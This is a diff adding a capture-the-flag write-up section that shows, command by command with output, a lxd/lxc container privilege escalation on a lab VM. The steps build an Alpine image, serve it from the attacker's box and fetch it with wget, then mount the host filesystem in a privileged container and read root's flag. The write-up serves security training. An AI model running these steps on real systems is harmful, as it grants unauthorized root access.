@@ -118,7 +118,7 @@ From here you would simply type `/bin/bash -p` to get root:
 
 ## Unintended Privilege Escalation \#1: ip script
 
-The write up for this method was done by **tjc_#5043**
+The write up for this method was done by **tjc_#5043** on Discord
 
 ### Gathering Info
 
@@ -216,6 +216,155 @@ One more reboot and the flag will be located in the oscp home directory and owne
 -rwxr-xr-x 1 root root   88 Jul  9 08:15 ip.old
 -rw-r--r-- 1 root root  721 Jul 25 16:13 ls.txt
 ```
+
+## Unintended Privilege Escalation \#2: lxd/lxc
+
+The write up for this method was done by **TrenchesofIT (JJ)#5548** on Discord - you may view his write up at [https://www.trenchesofit.com/2020/07/25/oscp-voucher-giveaway-vm-using-unintended/](https://www.trenchesofit.com/2020/07/25/oscp-voucher-giveaway-vm-using-unintended/)
+
+### oscp user's groups
+
+```
+-bash-5.0$ id
+uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+```
+
+### Downloading lxd-alpine-builder github repo
+
+```
+kali@kali:~/tools/lxd/$ git clone https://github.com/saghul/lxd-alpine-builder.git
+kali@kali:~/tools/lxd/$ cd lxd-alpine-builder/
+kali@kali:~/tools/lxd/lxd-alpine-builder/$ ./build-alpine
+
+kali@kali:~/tools/lxd/lxd-alpine-builder$ ls
+alpine-v3.12-x86_64-20200719_2153.tar.gz  build-alpine  LICENSE  README.md
+```
+
+### Downloading to Victim
+
+Running a simple web service on our Kali
+
+```
+kali@kali:~/tools/lxd/lxd-alpine-builder$ sudo python -m SimpleHTTPServer 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+Downloading it on our victim
+
+```
+-bash-5.0$ wget http://172.16.42.163/alpine-v3.12-x86_64-20200719_2153.tar.gz
+--2020-07-22 23:44:35--  http://172.16.42.163/alpine-v3.12-x86_64-20200719_2153.tar.gz
+Connecting to 172.16.42.163:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3186439 (3.0M) [application/gzip]
+Saving to: 'alpine-v3.12-x86_64-20200719_2153.tar.gz.1'
+
+alpine-v3.12-x86_64-20200719_21 100%[=======================================================>]   3.04M  --.-KB/s    in 0.04s   
+
+2020-07-22 23:44:35 (86.6 MB/s) - 'alpine-v3.12-x86_64-20200719_2153.tar.gz.1' saved [3186439/3186439]
+```
+
+### The LXD Setup
+
+LXC is not in the default bin so lets find out where we need to specify execution from.
+
+```
+-bash-5.0$ find / -name lxc > lxcsearch.txt
+-bash-5.0$ head lxcsearch.txt
+/snap/lxd/16100/bin/lxc
+/snap/lxd/16100/commands/lxc
+/snap/lxd/16100/lxc
+/snap/lxd/16044/bin/lxc
+/snap/lxd/16044/commands/lxc
+/snap/lxd/16044/lxc
+/snap/bin/lxc
+/usr/share/bash-completion/completions/lxc
+/etc/bash_completion.d/lxc
+/home/oscp/snap/lxd/16100/.config/lxc
+```
+
+/snap/bin/lxc is what I use for LXC commands moving forward. Lets import the image.
+
+```
+-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-x86_64-20200719_2153.tar.gz --alias trenchesofit
+Image imported with fingerprint: e279d5bc0806b79884c8a0cf7952c86a53d9da5a23b7e13ee75b42628118b8f9
+```
+
+```
+-bash-5.0$ /snap/bin/lxc image list
++--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
+|    ALIAS     | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
++--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
+| trenchesofit | e279d5bc0806 | no     | alpine v3.12 (20200719_21:53) | x86_64       | CONTAINER | 3.04MB | Jul 22, 2020 at 11:59pm (UTC) |
++--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
+```
+
+Create a storage pool and assign storage location.
+
+```
+-bash-5.0$ /snap/bin/lxc storage create pool dir
+Storage pool pool created
+```
+
+```
+-bash-5.0$ /snap/bin/lxc profile device add default root disk path=/ pool=pool
+Device root added to default
+-bash-5.0$ /snap/bin/lxc storage list
++------+-------------+--------+---------------------------------------------+---------+
+| NAME | DESCRIPTION | DRIVER |                   SOURCE                    | USED BY |
++------+-------------+--------+---------------------------------------------+---------+
+| pool |             | dir    | /var/snap/lxd/common/lxd/storage-pools/pool | 1       |
++------+-------------+--------+---------------------------------------------+---------+
+```
+
+Initiate the instance using the name “trenchesofit” or the alias specified during the image import.
+
+```
+-bash-5.0$ /snap/bin/lxc init trenchesofit ignite -c security.privileged=true
+Creating ignite
+                                          
+The instance you are starting doesn't have any network attached to it.
+  To create a new network, use: lxc network create
+  To attach a network to an instance, use: lxc network attach
+```
+
+Mount the host file system and start the instance.
+
+```
+-bash-5.0$ /snap/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
+Device trenches added to ignite
+```
+
+`-bash-5.0$ /snap/bin/lxc start ignite`
+
+Now execute bash on the container. You will see we are now root on the container.
+
+```
+-bash-5.0$ /snap/bin/lxc exec ignite /bin/sh
+~ # 
+~ # id
+uid=0(root) gid=0(root)
+```
+
+We initially mounted the host file system in the /mnt/root of the container.
+
+```
+/mnt/root # ls
+bin         dev         lib         libx32      mnt         root        snap        sys         var
+boot        etc         lib32       lost+found  opt         run         srv         tmp
+cdrom       home        lib64       media       proc        sbin        swap.img    usr
+```
+
+Now we have permissions to navigate to /mnt/root/root and view the flag.txt
+
+```
+/ # cd /mnt/root/root
+/mnt/root/root # ls
+fix-wordpress  flag.txt       snap
+/mnt/root/root # cat flag.txt
+d73b****SNIP****4538
+```
+
 
 
 
